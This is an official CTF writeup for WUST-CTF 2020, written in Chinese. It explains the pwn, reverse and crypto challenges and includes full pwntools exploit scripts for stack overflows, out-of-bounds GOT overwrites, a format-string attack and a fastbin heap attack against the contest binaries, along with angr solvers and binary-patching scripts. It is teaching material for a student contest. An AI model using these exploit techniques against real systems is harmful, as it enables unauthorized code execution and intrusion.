---
title: WUST-CTF 2020 官方 Writeup
date: 2020-03-30 21:00:00
tags: 
- CTF 
- WriteUps
categories: 
- CTF
---
# 前言

去年12月份左右，突然彼得一激灵，想弄个萌新赛给大一大二的打打，不然大家平时都没啥机会打比赛（毕竟现在比赛都是把萌新骗进来杀，一点不友好）。然后开始想赛制，奖励，策划，出题... 经过了各种申请和修改，终于申请成功了，也就有了学校的第一个CTF。一开始没有想到会有那么多外校的师傅来打，所以在环境，题目设置上会出现一些大大小小的问题，加上题目可能对很多师傅来说太简单了，希望师傅们见谅。感谢各位师傅的捧场，你们认真做就是对出题人最好的评价。感谢各路师傅投稿的 writeup，这篇 writeup 作为官方 writeup，就以出题人的角度来写。

<!--more-->

# Pwn

## getshell - 33 solves

>Author: ColdShield

flag:`wctf2020{E@sy_get_shel1}`

**程序分析**

![GndqxJ.png](https://s1.ax1x.com/2020/03/30/GndqxJ.png)

开启栈不可执行，没有 canary，PIE 保护

![Gndza6.png](https://s1.ax1x.com/2020/03/30/Gndza6.png)

具体漏洞在`vulnerable`函数中，栈溢出，溢出`0x20-0x18`可覆盖8个字节，即刚好覆盖到返回地址，由于程序内置后门

![GndOM9.png](https://s1.ax1x.com/2020/03/30/GndOM9.png)

返回地址设置成`0x0804851B`即可

**EXP**

和之前换乐赛一样，我的exp都是一个demo copy出来的，主要看`# todo here`下面的内容就好

```python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = 'getshell'	#binary's name here
context.binary = binary		#context here
context.log_level='debug'
pty = process.PTY
p = process(binary, aslr = 1, stdin=pty, stdout=pty)	#process option here
'''
Host ='0.0.0.0'
Port =2333
p = remote(Host,Port)
'''
elf = ELF(binary)
libc = elf.libc

my_u64 = lambda x: u64(x.ljust(8, '\0'))
my_u32 = lambda x: u32(x.ljust(4, '\0'))
global_max_fast=0x3c67f8
codebase = 0x555555554000
def loginfo(what='',address=0):
	log.info("\033[1;36m" + what + '----->' + hex(address) + "\033[0m")

# todo here
p.recvuntil("\\ \n")
p.send('a'*(0x18+4)+p32(0x0804851B))


p.interactive()
```

## getshell2 - 7 solves

>Author: ColdShield

flag:`wctf2020{Sh_Als0_w0rks}`

**程序分析**

![GndxVx.png](https://s1.ax1x.com/2020/03/30/GndxVx.png)

和前面那个程序的保护一样

![Gndb24.png](https://s1.ax1x.com/2020/03/30/Gndb24.png)

具体漏洞在`vulnerable`函数中，栈溢出，溢出`0x24-0x18`可覆盖0xC个字节，可覆盖返回地址和函数第一个参数

但是程序的后门是这样的

![GndHGF.png](https://s1.ax1x.com/2020/03/30/GndHGF.png)

![Gnd7PU.png](https://s1.ax1x.com/2020/03/30/Gnd7PU.png)

很显然`/bbbbbbbbin_what_the_f?ck__--??/sh`不是一个正常路径，像之前那样设置返回地址到这个函数直接去执行肯定会失败，此时就需要知道环境变量中的`PATH`是什么东西，以及sh这个shell程序是怎么被`system`找到然后调用的(自行百度吧...这里不解释了)

知道了PATH之后
因为我们程序中函数调用字符串的时候，都是通过字符串指针调用的

![Gndjq1.png](https://s1.ax1x.com/2020/03/30/Gndjq1.png)

我们直接使用该字符串中`sh`地址(0x08048670)的作为参数然后将返回地址直接设置成`call system`的地址(0x08048529)即可

**EXP**

```python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = 'getshell-2'	#binary's name here
context.binary = binary		#context here
context.log_level='debug'
pty = process.PTY
#p = process(binary, aslr = 1, stdin=pty, stdout=pty)	#process option here

Host ='0.0.0.0'
Port =2334
p = remote(Host,Port)

elf = ELF(binary)
libc = elf.libc

my_u64 = lambda x: u64(x.ljust(8, '\x00'))
my_u32 = lambda x: u32(x.ljust(4, '\x00'))
global_max_fast=0x3c67f8
codebase = 0x555555554000
def loginfo(what='',address=0):
	log.info("\033[1;36m" + what + '----->' + hex(address) + "\033[0m")

# todo here
p.recvuntil("\\ \n")
p.send('a'*(0x18+4)+p32(0x08048529)+p32(0x08048670))


p.interactive()
```

## number_game - 16 solves

>Author: ColdShield

flag:`wctf2020{Opc0de_neg_Is_StraNge}`

**程序分析**

![GnwtoV.png](https://s1.ax1x.com/2020/03/30/GnwtoV.png)

ps：这里v2是canary，前面两个程序都没有开启这个保护所以看不到

这里的意思大致就是输入一个int整数，两次判断`v1`是否小于零，都满足的话就给出一个shell，但是中间做了一次`v1=-v1`的操作

![GnwYd0.png](https://s1.ax1x.com/2020/03/30/GnwYd0.png)

这个操作是通过neg指令实现的，这里这个指令的操作是将eax按位求反然后+1，如果我们想要被操作之后的eax最高位仍未1（保持这个数为负），之前eax就只能是`1000000...0`，即最高位为1然后其余位全为0，这个数在4字节的表述下就是这样的

![GnwDy9.png](https://s1.ax1x.com/2020/03/30/GnwDy9.png)

用`scanf`输入这个数就可以满足了

## Closed - 10 solves

>Author: ColdShield

flag:`wctf2020{A_pr@ctical_Trick}`

**程序分析**

![GnwrLR.png](https://s1.ax1x.com/2020/03/30/GnwrLR.png)

这个题的目的就是想让你们学习一下什么是文件描述符还有输出重定位的知识（具体就自行百度吧）

这个程序虽然给出了shell，但是在之前关闭了进程标准输出`1`和标准错误输出`2`，所以getshell后自然也无法输出内容

这里介绍一个小trick：将标准输出重定位到标准输入`0`，也可以实现回显，具体见[这里](https://unix.stackexchange.com/questions/177228/behaviour-of-10-in-bash)

运行程序之后`sh 1>&0`即可实现回显

## NameYourCat - 4 solves

>Author: ColdShield

flag:`wctf2020{Cats_Are_Cute_right?}`

**程序分析**

![Gnwye1.png](https://s1.ax1x.com/2020/03/30/Gnwye1.png)

开启了canary还有栈不可执行，没有PIE

![Gnw6dx.png](https://s1.ax1x.com/2020/03/30/Gnw6dx.png)

main函数的意思就是5次循环，然后每次都执行一次NameWhich，这个函数的参数是v3

ps：因为IDA经常把函数的参数识别出问题，所以一定要点进具体的函数去看或者什么的

NameWhich是这样的

![GnwUiT.png](https://s1.ax1x.com/2020/03/30/GnwUiT.png)

在a1上按y将类型改成`char *`

![GnwdWF.png](https://s1.ax1x.com/2020/03/30/GnwdWF.png)

此时再来缕程序的意思，main'中v3是一个char [40]的数组，然后每次我们在NameWhich中输入的下标后寻址都是`a1[8*v2]`，所以这个时候大致就知道了原本程序应该是写了一个二维数组`[5][8]`

但是程序没有对我们输入的下标做检查，存在一个数组越界写，此时由于程序自带后门，数组在栈上，所以我们有一次将返回地址写成后门地址即可，具体下标经过简单计算即可得到：`(0x34+4)/8=7`（对计算下标不熟悉的一定要自己去算一算）

ps：这里还提个醒，这种输入的地方一定要注意有没有`\x0A`，就是换行符，如果输入字符串中碰到这个，scanf就直接截断了

**EXP**

```python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = 'NameYourCat'	#binary's name here
context.binary = binary		#context here
context.log_level='debug'
pty = process.PTY
#p = process(binary, aslr = 1, stdin=pty, stdout=pty)	#process option here

Host ='0.0.0.0'
Port =2337
p = remote(Host,Port)

elf = ELF(binary)
libc = elf.libc

my_u64 = lambda x: u64(x.ljust(8, '\0'))
my_u32 = lambda x: u32(x.ljust(4, '\0'))
global_max_fast=0x3c67f8
codebase = 0x555555554000
def loginfo(what='',address=0):
	log.info("\033[1;36m" + what + '----->' + hex(address) + "\033[0m")

# todo here
def namefor(idx,name):
	p.recvuntil("which?\n>")
	p.sendline(str(idx))
	p.recvuntil('name plz: ')
	p.sendline(name)

namefor(0,'A')
namefor(1,'B')
namefor(2,'C')
namefor(3,'D')
namefor(7,p32(0x080485CB))

p.interactive()
```

## NameYourDog - 5 solves

>Author: ColdShield

flag:`wctf2020{Woof_wOOf_wooF}`

**程序分析**

![GnwBQJ.png](https://s1.ax1x.com/2020/03/30/GnwBQJ.png)

程序基本上和NameYourCat一模一样

唯一不同之处在于`Dogs`此时不在栈上了，而是在bss段上

此时的数组越界就变成了下标为负数时利用，从而可以任意修改程序地址空间的内容，由于程序没有开启`FULL Relo`我这里最简单的方法就是修改GOT表（不知道GOT表是啥的小伙伴也请自行百度学习233333）

我采用的方法是将`scanf`的GOT表项修改为后门函数地址，从而在后续执行到scanf的时候就直接getshell了

此时的下标计算：`(0x0804A028-0804A060)/8=-7`

**EXP**

```python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = 'NameYourDog'	#binary's name here
context.binary = binary		#context here
context.log_level='debug'
pty = process.PTY
#p = process(binary, aslr = 1, stdin=pty, stdout=pty)	#process option here

Host ='0.0.0.0'
Port =2338
p = remote(Host,Port)

elf = ELF(binary)
libc = elf.libc

my_u64 = lambda x: u64(x.ljust(8, '\0'))
my_u32 = lambda x: u32(x.ljust(4, '\0'))
global_max_fast=0x3c67f8
codebase = 0x555555554000
def loginfo(what='',address=0):
	log.info("\033[1;36m" + what + '----->' + hex(address) + "\033[0m")

# todo here
def namefor(idx,name):
	p.recvuntil("which?\n>")
	p.sendline(str(idx))
	p.recvuntil('name plz: ')
	p.sendline(name)

namefor(0,'A')
namefor(1,'B')
namefor(2,'C')
namefor(-7,p32(0x080485CB))

p.interactive()
```



## babyfmt - 2 solves

> Author: ru7n

本题就是把一些点糅合再了一起，没啥新意，:P

程序一开始是个询问时间的函数**ask_time**：

```c
unsigned __int64 ask_time()
{
  __int64 v1; // [rsp+0h] [rbp-20h]
  __int64 v2; // [rsp+8h] [rbp-18h]
  __int64 v3; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts("dididada.....");
  printf("tell me the time:");
  _isoc99_scanf("%ld", &v1);
  _isoc99_scanf("%ld", &v2);
  _isoc99_scanf("%ld", &v3);
  printf("ok! time is %ld:%ld:%ld\n", v1, v2, v3);
  return __readfsqword(0x28u) ^ v4;
}
```

要求我们输入数字，然后在打印出来

这里的一个知识点是，如果输入和`scanf`函数需求的格式不一致，那么是不会改变变量的值的，意思就是**scanf**本来要求我们要输入数字(%ld)，但我们输入'a'啊，'b'啊什么的，反正不是数字就行，这样`v1,v2,v3`的值就不会改变，到了`printf("ok! time is %ld:%ld:%ld\n", v1, v2, v3);`这句的时候就会把栈里的内容打印出来，泄露出地址，本题是泄露了程序的基地址

然后就到了菜单题：

```c
  puts("1. leak");
  puts("2. fmt_attack");
  puts("3. get_flag");
  puts("4. exit");
  printf(">>");
```

**leak**函数给了一次任意读一字节的机会：

```c
unsigned __int64 __fastcall leak(_DWORD *a1)
{
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( *a1 > 0 )
  {
    puts("No way!");
    exit(1);
  }
  *a1 = 1;
  read_n(&buf, 8LL);
  write(1, buf, 1uLL);
  return __readfsqword(0x28u) ^ v3;
}
```

**fmt_attack**函数给了一次格式化字符串攻击的机会：

```c
unsigned __int64 __fastcall fmt_attack(_DWORD *a1)
{
  char format; // [rsp+10h] [rbp-40h]
  unsigned __int64 v3; // [rsp+48h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  memset(&format, 0, 0x30uLL);
  if ( *a1 > 0 )
  {
    puts("No way!");
    exit(1);
  }
  *a1 = 1;
  read_n(&format, 0x28LL);
  printf(&format, 0x28LL);
  return __readfsqword(0x28u) ^ v3;
}
```

最后是**get_flag**函数：

```c
void __noreturn get_flag()
{
  int fd; // ST0C_4
  char s2; // [rsp+10h] [rbp-60h]
  unsigned __int64 v2; // [rsp+68h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(&s2, 0, 0x50uLL);
  puts("If you can open the door!");
  read_n(&s2, 64LL);
  if ( !strncmp(secret, &s2, 0x40uLL) )
  {
    close(1);
    fd = open("/flag", 0);
    read(fd, &s2, 0x50uLL);
    printf(&s2, &s2);
    exit(0);
  }
  puts("No way!");
  exit(1);
}
```

很明显，如果我们要拿到**flag**，就必须绕过`strncmp(secret, &s2, 0x40uLL)`，绕过了这个之后，由于`close(1)`把输出流关了，所以我们还得想办法让`flag`能打印出来

首先是绕过`strncmp`，这个简单，只要把`secret`的首字节变为`\x00`就好，这样我们只要输入`\x00`就能绕过这个检查，原理：

```c
// strncmp源码
int
STRNCMP (const char *s1, const char *s2, size_t n)
{
  unsigned char c1 = '\0';
  unsigned char c2 = '\0';

  if (n >= 4)
    {
      size_t n4 = n >> 2;
      do
	{
	  c1 = (unsigned char) *s1++;
	  c2 = (unsigned char) *s2++;
	  if (c1 == '\0' || c1 != c2)
	    return c1 - c2;
         ...........................................
```

绕过了这个`strncmp`后，就要看看怎么把`flag`打印出来了

我们可以看到在程序的`.bss`段里存放在`stdin,stdout,stderr`的指针：

```c
.bss:0000000000202020 _bss            segment para public 'BSS' use64
.bss:0000000000202020                 assume cs:_bss
.bss:0000000000202020                 ;org 202020h
.bss:0000000000202020                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.bss:0000000000202020                 public stdout@@GLIBC_2_2_5
.bss:0000000000202020 ; FILE *stdout
.bss:0000000000202020 stdout@@GLIBC_2_2_5 dq ?                ; DATA XREF: LOAD:00000000000004B8↑o
.bss:0000000000202020                                         ; initial+35↑r
.bss:0000000000202020                                         ; Alternative name is 'stdout'
.bss:0000000000202020                                         ; Copy of shared data
.bss:0000000000202028                 align 10h
.bss:0000000000202030                 public stdin@@GLIBC_2_2_5
.bss:0000000000202030 ; FILE *stdin
.bss:0000000000202030 stdin@@GLIBC_2_2_5 dq ?                 ; DATA XREF: LOAD:0000000000000500↑o
.bss:0000000000202030                                         ; initial+17↑r
.bss:0000000000202030                                         ; Alternative name is 'stdin'
.bss:0000000000202030                                         ; Copy of shared data
.bss:0000000000202038                 align 20h
.bss:0000000000202040                 public stderr@@GLIBC_2_2_5
.bss:0000000000202040 ; FILE *stderr
.bss:0000000000202040 stderr@@GLIBC_2_2_5 dq ?                ; DATA XREF: LOAD:0000000000000530
```

动态调试的时候跟进`printf`函数，会发现`printf`会取这里的指针：

```
 ► 0x7f8f4b0c488a <printf+138>    mov    rax, qword ptr [rip + 0x36e6bf]
   0x7f8f4b0c4891 <printf+145>    mov    rdi, qword ptr [rax]
   0x7f8f4b0c4894 <printf+148>    call   vfprintf <0x7f8f4b0bc170>
 
   0x7f8f4b0c4899 <printf+153>    add    rsp, 0xd8
   0x7f8f4b0c48a0 <printf+160>    ret    
 
   0x7f8f4b0c48a1                 nop    word ptr cs:[rax + rax]
.....................................................................
pwndbg> telescope 0x7f8f4b0c4891+0x36e6bf
00:0000│   0x7f8f4b432f50 —▸ 0x558030d75020 —▸ 0x7f8f4b434620 (_IO_2_1_stdout_) ◂— 0xfbad2887
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x558030b73000     0x558030b75000 r-xp     2000 0      /mnt/hgfs/shared/challenge/dididada/dididada
    0x558030d74000     0x558030d75000 r--p     1000 1000   /mnt/hgfs/shared/challenge/dididada/dididada
    0x558030d75000     0x558030d76000 rw-p     1000 2000   /mnt/hgfs/shared/challenge/dididada/dididada

```

根据调试可以看到，本来`printf`是取`stdout`的，输出流嘛，但是如果我们把`.bss`出的`stdout`指针改为指向`stderr`，那`close(1)`，是不是就没问啥问题了，反正`stderr`的`fileno`是2，而且`stdout`和`stderr`地址很接近：

```
pwndbg> p stdout
$1 = (struct _IO_FILE *) 0x7f8f4b434620 <_IO_2_1_stdout_>
pwndbg> p stderr
$2 = (struct _IO_FILE *) 0x7f8f4b434540 <_IO_2_1_stderr_>
```

综上，得到思路为：

- ask_time泄露程序基地址
- leak泄露`stderr`的第二个字节，（为了消除那1/16的概率
- fmt_attack，把secret第一个字节改为`\x00`，在把bss段里的`stdout`改为指向`stderr`

最终exp为：

```c
# usage: python exp.py REMOTE=x.x.x.x
from pwn import *

context.arch='amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil(">>")
	p.sendline(str(command))

def main(host,port=16253):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./dididada")
		# gdb.attach(p)
		debug(0x000000000000ECC)
	p.recvuntil("me the time:")
	p.send("+\n+\n+\n")
	p.recvuntil(":")
	elf_base = int(p.recvuntil(":")[:-1]) - 0xbd5
	info("elf : " + hex(elf_base))
	#leak stdout
	cmd(1)
	p.send(p64(elf_base+0x000000000202041))
	stderr = (ord(p.recv(1))<<8)|0x40	
	#fmt attack
	cmd(2)
	payload = "%11$hn%{}c%12$hn".format(stderr)
	payload = payload.ljust(0x18,"+")+p64(elf_base+0x000000000202060)
	payload += p64(elf_base+0x202020)

	p.send(payload)
	cmd(3)
	p.send("\x00"*0x40)
	p.interactive()
	
if __name__ == "__main__":
	main(args['REMOTE'])
```

## easyfast - 2 solves

> Author: ColdShield

flag:`wctf2020{THE_MOST_EASY_FASTBINATTACK}`

预期是最简单的fastbin attack（但是出题是在比赛前夕补上的一道，粗心没给下标做检查导致和前面的题变成一个性质了...）

程序只能malloc三次，而且三次都只能是fast chunk，free的时候没有检查指针也没有对指针清零，Modify也是直接read 8个字节，没有多余检查

程序getshell只需要满足data段的变量为0即可，然后在data段上有一个0x50的fakesize

![GnjA6U.png](https://s1.ax1x.com/2020/03/30/GnjA6U.png)

所以思路就是 

`malloc(0x48)->free(array[0])->modify(array[0],p64(&fakesize-8))`

`->malloc(0x48)->malloc(0x48)->modify(array[0],p64(0))`

**exp**

```python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './easyheap'	#binary's name here
context.binary = binary		#context here
context.log_level='debug'
pty = process.PTY
p = process(binary, aslr = 1, stdin=pty, stdout=pty)	#process option here
'''
Host ='101.200.53.102'
Port =22222
p = remote(Host,Port)
'''

elf = ELF(binary)
libc = elf.libc

my_u64 = lambda x: u64(x.ljust(8, '\x00'))
my_u32 = lambda x: u32(x.ljust(4, '\x00'))
global_max_fast=0x3c67f8
def loginfo(what='',address=0):
	log.info("\033[1;36m" + what + '----->' + hex(address) + "\033[0m")

# todo here
def Alloc(size):
	p.recvuntil("choice>\n")
	p.sendline("1")
	p.recvuntil("size>\n")
	p.sendline(str(size))

def Free(index):
	p.recvuntil("choice>\n")
	p.sendline("2")
	p.recvuntil("index>\n")
	p.sendline(str(index))

def Modify(index,content):
	p.recvuntil("choice>\n")
	p.sendline("3")
	p.recvuntil("index>\n")
	p.sendline(str(index))
	p.send(content)

Alloc(0x48)
Free(0)
Modify(0,p64(0x602080))
Alloc(0X48)
Alloc(0X48)
Modify(2,'\x00')

p.interactive()
```

# Reverse

## Cr0ssFun - 42 solves

> Author: 52HeRtz

出这题的前几天，刚好去俄罗斯一个比赛瞧了一眼，发现有个这样的题，差点没把我气死，于是我就差不多的再出了一个类似的题hhhhh。。。

丢进 IDA，可以看见一堆函数

![GnXfyD.png](https://s1.ax1x.com/2020/03/30/GnXfyD.png)

可以看见一个check函数，拼命的调用其它函数

![GnXWQO.png](https://s1.ax1x.com/2020/03/30/GnXWQO.png)

![GnXhOe.png](https://s1.ax1x.com/2020/03/30/GnXhOe.png)

接下来就是不断地套娃，其实就把所有的字符都弄出来就可以了，手动或者写脚本都可以。

当然出题人作为一个很懒的web狗，当然是喜欢用工具，可以用 angr 求解。

看起来输入正确的 flag 后会打印 `Your flag is correct, go and submit it!`

用 angr 求解什么样的输入可以使得程序输出 `Your flag is correct, go and submit it!`

```python
import angr
proj = angr.Project("Cr0ssfun")
simgr = proj.factory.simgr()
simgr.explore(find=lambda s: b"Your flag is correct, go and submit it!" in s.posix.dumps(1))
print(simgr.found[0].posix.dumps(0))
```

等几秒就出来了

![GnX5eH.jpg](https://s1.ax1x.com/2020/03/30/GnX5eH.jpg)

## level1 - 30 solves

> Author: ColdShield

flag:`wctf2020{d9-dE6-20c}`

![GnR5ZD.png](https://s1.ax1x.com/2020/03/30/GnR5ZD.png)

程序流程的意思就是：

1. 从flag这个文件中读出了长度为0x14的字符串到ptr指向的地方去
2. 从1开始到0x13，循环，i为奇数时输出`ptr[i]<<i`，i为偶数时输出`i*ptr[i]`，格式都是`%ld`

然后程序给出了一个`output.txt`

根据output逆推出flag即可，这里给一个写的很简陋的py程序供参考

```python
with open("output.txt","r") as f:
    i=1
    while(1):
        if i%2==0:
            num=int(f.readline().strip('\n'))
            print(chr(int(num/i)),end=""),
        else:
            num=int(f.readline().strip('\n'))
            print(chr(num>>i),end=""),
        i+=1
        if i==0x14 :
            break
```

当然因为程序没有输出`ptr[0]`的内容，所以根据`wctf2020{}`的格式补上`w`就可以了

## level2 - 24 solves

>Author: ColdShield

flag:`wctf2020{Just_upx_-d}`

程序运行弹`where is it?`

然后丢进IDA发现啥都没有，这种啥都没有的程序就是很明显加壳的程序

![Gn02Bn.png](https://s1.ax1x.com/2020/03/30/Gn02Bn.png)

用Detect It Easy查壳，UPX 3.95压缩壳

![Gn06Xj.png](https://s1.ax1x.com/2020/03/30/Gn06Xj.png)

然后直接用upx对应版本的工具脱壳就好了：https://github.com/upx/upx/tags

再丢进IDA就能看到flag

![Gn0fA0.png](https://s1.ax1x.com/2020/03/30/Gn0fA0.png)

## level3 - 26 solves

>Author: ColdShield

flag:`wctf2020{Base64_is_the_start_of_reverse}`

![Gn0hNV.png](https://s1.ax1x.com/2020/03/30/Gn0hNV.png)

稍微看一下，main程序的意思就是输入一串字符串，随机去执行两个分支，一个分支是用`base64_encode`编码之后输出编码后的内容，另外一个分支就是那些字符串，很明显就是要解这一串`d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==`的码

但是直接解就会是这样：

![Gn0ycQ.png](https://s1.ax1x.com/2020/03/30/Gn0ycQ.png)

就是程序说的`different from the standard`

一般CTF碰到这种情况，要么是`base64_encode`中的编码算法出了问题，要么是base64的编码table出了问题。显然分析前者会比较麻烦，所以先看看table

![Gn0o3F.png](https://s1.ax1x.com/2020/03/30/Gn0o3F.png)

IDA里面看上去table是正常的，但是注意一下右边的引用数是没有显示完的，后面还有`...`

这个时候可以开IDA的`Options->general`找到`Cross-references`下的`Disassembly(non-graph)`，把这个数值改大一点

![Gn07jJ.png](https://s1.ax1x.com/2020/03/30/Gn07jJ.png)

可以看到我们的`base64_table`还在另外一个`O_OLookAtYou`的函数里面被引用了

ps：Emmmmm...怎么说呢，出这个题的意思就是想让你们学会看数据引用&发现一些程序中看起来奇怪的函数名，比如这个题目的话，如果一上来就看到了这个`O_OLookAtYou`就肯定会点进去看一看，就会知道base64_table被改过了，也就知道base64编码出问题多半是因为table而不是算法出问题(节省分析的时间)，虽然说从main的函数调用里面是看不到这个函数的(如下图`Xfers graph from`)

![GnWRYj.png](https://s1.ax1x.com/2020/03/30/GnWRYj.png)

因为这个函数的函数指针被放在了ELF中main函数执行之前的初始化段`_init_array`，在执行main函数之前这个函数就被调用了（linux下用gcc编译之前在函数声明前面加上`__attribute__((constructor))`）

![GnWIXV.png](https://s1.ax1x.com/2020/03/30/GnWIXV.png)

这个函数就是把`base64_table`中前面下标0-9处的十个字符，和后面的下标19~10处的十个字符互相调换了一下

下面就是根据新的`base64_table`解刚开始的那串码了，这里不再赘述

## level4 - 12 solves

>Author: ColdShield

flag:`wctf2020{This_IS_A_7reE}`

![GnWTmT.png](https://s1.ax1x.com/2020/03/30/GnWTmT.png)

直接运行的话程序是输出这个，学过数据结构的应该能很明显地看到这是在遍历什么东西，(`*left`，`*right`：二叉树)

然后给了两种遍历方式出来的字符串，第三种是显示`No way`，所以flag肯定就是第三种遍历方式遍历出来的了，再来分析

**init**

![GnWqk4.png](https://s1.ax1x.com/2020/03/30/GnWqk4.png)

首先看到`init`函数里面做的是一堆初始化的流程，这样直接从IDA看的话应该看不出什么来，想分析这里的话需要我们自己一步步的来简化这些乱七八糟的东西（俗称就是人能看XD）不过这个题不简化这里一样可以写，所以这个简化方式留到开学之后看能不能再跟你们线下讲吧....截图什么的太麻烦了，这里放几张效果图

![GnWH7F.png](https://s1.ax1x.com/2020/03/30/GnWH7F.png)

![GnWKY9.png](https://s1.ax1x.com/2020/03/30/GnWKY9.png)

![GnWmo4.png](https://s1.ax1x.com/2020/03/30/GnWmo4.png)

**type1**

![GnWuFJ.png](https://s1.ax1x.com/2020/03/30/GnWuFJ.png)

可以看到这是一个递归函数，如果写过数据结构树遍历的话肯定特别熟悉，这个是中根遍历的递归算法

**type2**

同样如果对数据结构树遍历熟悉的话可以看出来这个是后根遍历的递归算法

![GnWMWR.png](https://s1.ax1x.com/2020/03/30/GnWMWR.png)

所以flag就肯定是先根遍历得到的字符串了，可以去网上学一下树的三种遍历中如何根据其中两种遍历得到另外一种，好像还是一个面试题来着？不过我感觉能get到的话就很好理解，这里复原的时候唯一一个可能会卡壳的就是在复原根节点右子树的时候有两个`_`，要稍微注意一下规律

ps：一般来说的话如果涉及到数据结构的逆向题，肯定不会像我这样把两种遍历都给出来的....可能就直接一个裸的程序给你让你去找flag，所以这个时候就要学会写脚本or调试硬刚，这个题主要还是希望能让你们熟悉树或其他数据结构应该怎么来分析&这些数据结构在底层是怎么存储的

如果树太大的情况下还可以直接去硬刚汇编，因为这两个递归函数指令数量都是一样的，只是顺序不同而已，用下面这个IDC脚本把type2的指令顺序交换一下（把putchar放到前面去）

```c
static main()
{
    auto address1=0x4007CA;
    auto address2=0x4007EA;
    auto address3=0x4007FB;
    auto code1="";
    auto i=0,j=0;
    
    for(i=address1;i<address2;i++)
    {
    	code1=code1+Byte(i);
    }

    j=address1;
    for(i=address2;i<address3;i++)
    {
        PatchByte(j++,Byte(i));
    }
        
    for(i=0;i<strlen(code1);i++)
    {
        PatchByte(j++,ord(code1[i]));
    }
}
```

再把call指令的偏移用keypatch改改就好了，强行改成先根遍历，效果图
![GuC2sP.png](https://s1.ax1x.com/2020/03/30/GuC2sP.png)

执行就有flag

![GuCgMt.png](https://s1.ax1x.com/2020/03/30/GuCgMt.png)

## funnyre - 7 solves

> Author: Tsiao
>
> 当我跟启奡聊到出题的时候，他很热情地在百忙中抽空给我出了一道题，我觉得如果世上还有雷锋，我觉得一定会是 Tsiao。

考察：

1、 简单花指令的去除

2、 在有限域上运算的简化

首先去除花指令：

```python
ads = 0x4005B0

end = 0x401DC0

codes = get_bytes(ads, end-ads)

codes = codes.replace("\x74\x03\x75\x01\xe8\x90", "\x90\x90\x90\x90\x90\x90")

patch_bytes(ads, codes)

print "[+] patch ok"
```

 随后可以看到逻辑，进行了数次xor操作，又进行了数次移位操作，这里可以使用IDAPython获取每一个操作的详细数据，然后化简，也可以使用angr进行暴力求解。

解法一：暴力求解：

```python
dt = [0xd9, 0x2c, 0x27, 0xd6, 0xd8, 0x2a, 0xda, 0x2d, 0xd7, 0x2c, 0xdc, 0xe1, 0xdb, 0x2c, 0xd9, 0xdd, 0x27, 0x2d, 0x2a, 0xdc, 0xdb, 0x2c, 0xe1, 0x29, 0xda, 0xda, 0x2c, 0xda, 0x2a, 0xd9, 0x29, 0x2a]


def kaisa(xx, kk):
    return [(x+kk) & 0xFF for x in xx]


def xor(xx, kk):
    return [x ^ kk for x in xx]


def check(xx):
    for x in xx:
        if x < ord('0') or (x > ord('9') and x < ord('a')) or x > ord('f'):
            return False
    return True


if __name__ == '__main__':
    for k1 in range(0x100):
        tt = kaisa(dt, k1)
        for k2 in range(0x100):
            tt2 = xor(tt, k2)
            if check(tt2):
                print(bytes(tt2))
                print(k1, k2)
```

解法二：IDAPython根据指令去逆向：

```
def trans(xx, kk):
    return [(x-kk) & 0xFF for x in xx]
def xor(xx, kk):
    return [x^kk for x in xx]
def not_(xx):
    return [~x for x in xx]

dt = [0xd9, 0x2c, 0x27, 0xd6, 0xd8, 0x2a, 0xda, 0x2d, 0xd7, 0x2c, 0xdc, 0xe1, 0xdb, 0x2c, 0xd9, 0xdd, 0x27, 0x2d, 0x2a, 0xdc, 0xdb, 0x2c, 0xe1, 0x29, 0xda, 0xda, 0x2c, 0xda, 0x2a, 0xd9, 0x29, 0x2a]

ads = 0x4005B0
end = 0x401DC0
i = PrevHead(end)
while i > ads:
    if GetMnem(i) == 'xor' and GetOpnd(i, 0) == 'byte ptr [rdx+rax+5]':
        k = int(GetOpnd(i, 1).rstrip('h'), 16)
        dt = xor(dt, k)
        print("xor: {}".format(k))
    if GetMnem(i) == 'add' and GetOpnd(i, 0) == 'byte ptr [rdx+rax+5]':
        k = int(GetOpnd(i, 1).rstrip('h'), 16)
        dt = trans(dt, k)
        print("trans: {}".format(k))
    if GetMnem(i) == 'not' and GetOpnd(i, 0) == 'byte ptr [rdx+rax+5]':
        dt = not_(dt)
        print("not: {}".format(k))
    i = PrevHead(i)

print(dt) 
```

解法三：符号执行工具约束求解：

```python
import angr
import claripy

p = angr.Project("./funre", load_options={"auto_load_libs": False})
f = p.factory
state = f.entry_state(addr=0x400605)
flag = claripy.BVS("flag", 8*32)
state.memory.store(0x603055+0x300+5, flag)
state.regs.rdx = 0x603055+0x300
state.regs.rdi = 0x603055+0x300+5

sm = p.factory.simulation_manager(state)

print("[+] init ok")

sm.explore(find=0x401DAE)
if sm.found:
    print("[+] found!")
    x = sm.found[0].solver.eval(flag, cast_to=bytes)
    print(x)
```

![GnNG4g.png](https://s1.ax1x.com/2020/03/30/GnNG4g.png)

# Crypto

## 大数运算 - 55 solves

> Author: 52HeRtz

题目：

>flag等于 wctf2020{Part1-Part2-Part3-Part4} 每一Part都为数的十六进制形式（不需要0x)，并用 '-' 连接
>Part1 = `2020*2019*2018* ... *3*2*1` 的前8位
>Part2 = `520^1314 + 2333^666` 的前8位
>Part3 = 宇宙终极问题的答案 x, y, z绝对值和的前8位
>Part4 = 见图片附件，计算结果乘上1314

